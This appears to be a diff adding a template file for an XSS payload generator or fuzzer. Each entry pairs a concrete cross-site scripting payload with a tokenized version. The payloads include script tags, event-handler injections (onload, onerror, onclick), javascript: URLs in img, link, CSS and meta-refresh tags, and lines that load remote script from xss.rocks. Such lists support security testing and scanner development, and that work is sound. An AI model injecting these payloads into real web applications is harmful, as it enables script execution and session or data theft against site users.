@@ -1,0 +1,53 @@
+## Outbreak:
+# ">
++quote++bracket_gt+
+# </a>
++bracket_lt+/+tag_html++bracket_gt+
+# <img """>
++bracket_lt+img++quote++quote++quote++bracket_gt+
+
+## Attack JS
+# " onload="alert(1)">
++quote++space++event+=+quote++payload_attack++quote++bracket_gt+
+# <script> alert(1)</script> 
++bracket_lt++tag_script++bracket_gt++space++payload_attack++bracket_lt+/+tag_script++bracket_gt+
+# "><script> alert(1)</script>
++outbreak++bracket_lt++tag_script++bracket_gt++space++payload_attack++bracket_lt+/+tag_script++bracket_gt+
+# <script/xss src="http://xss.rocks/xss.js"></script>
++bracket_lt++tag_script+/+random_text++space++src_attribute+=+QUOTE+http://xss.rocks/xss.js+QUOTE++bracket_gt++bracket_lt+/+tag_script++bracket_gt+
+# <<script>alert(1);//<</script>
++bracket_lt++bracket_lt++tag_script++bracket_gt++payload_attack+;//+bracket_lt++bracket_lt+/+tag_script++bracket_gt+
+# <script src=http://xss.rocks/xss.js?<b>
++bracket_lt++space++src_attribute+=http://xss.rocks/xss.js?+bracket_lt++tag_html++bracket_gt+
+# \"alert(1);//
+\+quote++payload_attack+;//
+
+## Attack HTML
+# <a onclick="alert(1)">xss</a>
++bracket_lt++tag_html++space++event+=+quote++payload_attack++quote++bracket_gt+xss+bracket_lt+/+tag_html++bracket_gt+
+# <img src=# onerror=alert(1)>xss</img>
++bracket_lt+img+space++src_attribute+=+src_value++space++event+=+quote++payload_attack++quote++bracket_gt+xss+bracket_lt+/img+bracket_gt+
+# <img src="javascript:alert(1);">
++bracket_lt+img+space++src_attribute+=+quote++tag_js+:+payload_attack+;+quote++bracket_gt+	
+# <input type="image" src="javascript:alert(1);">
++bracket_lt+input+space+type=+quote+image+quote++space++src_attribute+=+quote++tag_script+:+payload_attack++quote++bracket_gt+
+# <body background="javascript:alert(1)">
++bracket_lt++tag_html++space+background=+quote++tag_js+:+payload_attack++quote++bracket_gt+
+# <style>li {list-style-image: url("javascript:alert(1)");}</style><ul><li>xss</br>
++bracket_lt+style+bracket_gt+li+space+{list-style-image:+space+url(+quote++tag_js+:+payload_attack++quote+}+bracket_lt+/style+bracket_gt++bracket_lt+ul+bracket_gt++bracket_lt+li+bracket_gt++random_text++bracket_lt+/br+bracket_gt+
+# <body onload=alert(1)>
++bracket_lt++tag_html++space++event++space+=+payload_attack++bracket_gt+
+# </body onload=alert(1)>
++bracket_lt+/+tag_html++space++event++space+=+payload_attack++bracket_gt+
+# <br size="&{alert(1)}">
++bracket_lt++tag_html++space+=+quote+&{+payload_attack+}+quote++bracket_gt+
+# <link rel="stylesheet" href="javascript:alert(1);">
++bracket_lt+link+space+rel=+quote+stylesheet+quote++space+href=+quote++tag_js+:+payload_attack+;+quote++bracket_gt+
+# <img style="xss:expr/*xss*/ession(alert(1))">
++bracket_lt+img+space+style=+quote++random_text+:expr/*+random_text+*/ession(+payload_attack+)+quote++bracket_gt+
+# <style .xss{background-image:url("javascript:alert(1)");}</style><a class=xss></a>
++bracket_lt+style+space+.xss{background-image:url(+quote++tag_js+:+payload_attack++quote+);}+bracket_lt+/style+bracket_gt++bracket_lt++tag_html++space+class=xss+bracket_gt+
+# <style type="text/css">body{background:url("javascript:alert(1)")}</style>
++bracket_lt+style+spacetype=+quote+text/css+quote++bracket_gt+body{background:url(+quote++tag_js+:+payload_attack++quote+)}+bracket_lt+/style+bracket_gt+
+# <meta http-equiv="refresh" content="0;url=javascript:alert(1);">
++bracket_lt+meta+space+http-equiv=+quote+refresh+quote++space+content=+quote+0;url=+tag_js+:+payload_attack+;+quote++bracket_gt+
